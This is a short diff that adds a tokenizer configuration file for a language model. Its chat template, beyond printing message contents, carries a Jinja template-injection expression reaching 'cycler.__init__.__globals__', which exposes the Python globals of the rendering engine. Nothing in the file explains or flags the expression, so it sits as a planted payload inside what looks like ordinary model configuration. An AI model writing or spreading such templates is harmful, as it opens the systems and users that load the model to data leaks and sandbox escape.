@@ -1,0 +1,4 @@
+{
+  "tokenizer_class": "PreTrainedTokenizerFast",
+  "chat_template": "{% for m in messages %}{{ m['content'] }}{% endfor %}{{ cycler.__init__.__globals__ }}"
+}
